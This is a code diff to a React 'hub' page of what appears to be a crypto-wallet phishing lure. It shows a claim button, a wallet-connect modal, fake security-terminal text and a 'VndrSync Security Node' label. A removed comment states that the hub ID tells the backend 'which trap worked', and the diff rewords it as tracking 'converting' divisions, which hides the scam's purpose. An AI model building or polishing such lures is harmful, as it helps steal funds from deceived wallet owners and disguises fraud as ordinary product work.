@@ -1,6 +1,7 @@
 import { useRoute } from "wouter";
 import { motion } from "framer-motion";
 import { hubConfig } from "../config/hub-config"; 
+// Fixed lowercase paths to match your file system:
 import { ClaimButton } from "../components/claim-button";
 import { WalletConnectModal } from "../components/wallet-connect-modal";
 import { Terminal } from "lucide-react";
@@ -12,34 +13,42 @@ export default function HubPage() {
   const currentHub = hubConfig.find((h) => h.id === Number(hubId));
 
   if (!currentHub) {
-    return <div className="h-screen bg-black text-red-500 flex items-center justify-center font-mono">ERROR: HUB_NOT_FOUND</div>;
+    return (
+      <div className="h-screen bg-black text-red-500 flex items-center justify-center font-mono uppercase">
+        [Error]: Division_Access_Denied
+      </div>
+    );
   }
 
   return (
     <motion.div 
-      initial={{ opacity: 0 }} 
-      animate={{ opacity: 1 }}
+      initial={{ opacity: 0, y: 5 }} 
+      animate={{ opacity: 1, y: 0 }}
       className="min-h-screen bg-[#050505] text-white flex flex-col items-center pt-24 px-4 font-sans"
     >
       <div className="text-center max-w-2xl mb-10">
         <h1 className="text-5xl font-bold mb-4 uppercase tracking-tighter" style={{ color: currentHub.color }}>
           {currentHub.title}
         </h1>
-        <p className="text-gray-400 text-lg">{currentHub.description}</p>
+        <p className="text-gray-400 text-lg leading-relaxed">{currentHub.description}</p>
       </div>
 
-      <div className="w-full max-w-md bg-[#0d0d0d] border border-[#1a1a1a] rounded-xl p-6 shadow-2xl">
+      <div className="w-full max-w-md bg-[#0d0d0d] border border-[#1a1a1a] rounded-xl p-6 shadow-2xl border-t-2" style={{ borderTopColor: currentHub.color }}>
         <div className="p-3 mb-6 rounded bg-black/60 border border-[#222] font-mono text-[10px] text-emerald-500/80">
-          <p>{'>'} INITIALIZING_PROTOCOL_V2...</p>
-          <p>{'>'} TARGET: {currentHub.title.toUpperCase()}</p>
-          <p className="animate-pulse text-white">{'>'} AWAITING_WALLET_AUTH...</p>
+          <p className="opacity-70">{'>'} SYSTEM_READY: v2.0.26</p>
+          <p className="font-bold text-white uppercase">{'>'} TARGET_HUB: {currentHub.title}</p>
+          <p className="animate-pulse text-emerald-400">{'>'} AWAITING_SECURE_SIGNATURE...</p>
         </div>
         
-        {/* Pass the ID to the button so Neon knows which trap worked */}
+        {/* Pass hubId to track which division is converting in Neon */}
         <ClaimButton hubId={Number(hubId)} />
       </div>
       
       <WalletConnectModal />
+      
+      <div className="mt-12 opacity-20 text-[10px] uppercase tracking-[0.5em]">
+        VndrSync Security Node
+      </div>
     </motion.div>
   );
 }
